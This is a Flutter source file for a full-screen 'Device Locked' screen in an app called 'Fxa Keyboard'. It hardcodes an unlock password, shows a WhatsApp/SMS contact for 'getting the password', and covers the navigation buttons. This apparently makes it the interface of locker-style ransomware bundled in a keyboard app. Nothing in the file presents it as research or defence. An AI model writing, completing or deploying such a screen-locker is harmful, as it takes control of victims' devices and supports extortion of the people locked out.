import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';

class LockScreen extends StatefulWidget {
  final VoidCallback onUnlocked;
  const LockScreen({super.key, required this.onUnlocked});

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final TextEditingController _passCtrl = TextEditingController();
  String _error = '';
  bool _obscure = true;

  // Change this to whatever password you want
  static const String correctPassword = 'fxa2024';

  // Change these to your real contact
  static const String contactNumber = '+8801XXXXXXXXX';
  static const String contactId = '@cyber_fxa';

  Future<void> _tryUnlock() async {
    if (_passCtrl.text.trim() == correctPassword) {
      widget.onUnlocked();
    } else {
      setState(() => _error = 'Wrong password');
      await Future.delayed(const Duration(milliseconds: 800));
      setState(() => _error = '');
    }
  }

  Future<void> _openContact() async {
    // Tries WhatsApp first, falls back to SMS
    final whatsapp = Uri.parse('https://wa.me/$contactNumber');
    final sms = Uri.parse('sms:$contactNumber?body=Unlock request for Fxa Keyboard');
    if (await canLaunchUrl(whatsapp)) {
      await launchUrl(whatsapp, mode: LaunchMode.externalApplication);
    } else {
      await launchUrl(sms);
    }
  }

  @override
  void dispose() {
    _passCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F0F1A),
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 28),
          child: Column(
            children: [
              const Spacer(flex: 2),
              const Icon(Icons.lock_outline, size: 80, color: Colors.redAccent),
              const SizedBox(height: 20),
              const Text(
                'Device Locked',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 26,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 12),
              const Text(
                'Enter the password to unlock.\n'
                'To unlock send a message to this number / ID\n'
                'with the password.',
                textAlign: TextAlign.center,
                style: TextStyle(color: Colors.white60, fontSize: 14, height: 1.5),
              ),
              const SizedBox(height: 8),
              Text(
                contactNumber,
                style: const TextStyle(
                  color: Colors.amber,
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
              ),
              Text(
                contactId,
                style: const TextStyle(color: Colors.amberAccent, fontSize: 14),
              ),
              const SizedBox(height: 32),
              TextField(
                controller: _passCtrl,
                obscureText: _obscure,
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  filled: true,
                  fillColor: const Color(0xFF1E1E2E),
                  hintText: 'Password',
                  hintStyle: const TextStyle(color: Colors.white38),
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: BorderSide.none,
                  ),
                  suffixIcon: IconButton(
                    icon: Icon(
                      _obscure ? Icons.visibility : Icons.visibility_off,
                      color: Colors.white54,
                    ),
                    onPressed: () => setState(() => _obscure = !_obscure),
                  ),
                ),
                onSubmitted: (_) => _tryUnlock(),
              ),
              if (_error.isNotEmpty) ...[
                const SizedBox(height: 10),
                Text(
                  _error,
                  style: const TextStyle(color: Colors.redAccent, fontSize: 13),
                ),
              ],
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.deepPurple,
                    foregroundColor: Colors.white,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                  ),
                  onPressed: _tryUnlock,
                  child: const Text('Unlock', style: TextStyle(fontSize: 16)),
                ),
              ),
              const SizedBox(height: 16),
              TextButton(
                onPressed: _openContact,
                child: const Text(
                  'Contact to get password',
                  style: TextStyle(color: Colors.amberAccent),
                ),
              ),
              const Spacer(flex: 3),
              // The three system-style buttons are visually present but do nothing
              // while this screen is showing (they are covered by the full-screen lock)
              const Text(
                'Navigation buttons disabled while locked',
                style: TextStyle(color: Colors.white24, fontSize: 11),
              ),
              const SizedBox(height: 12),
            ],
          ),
        ),
      ),
    );
  }
}
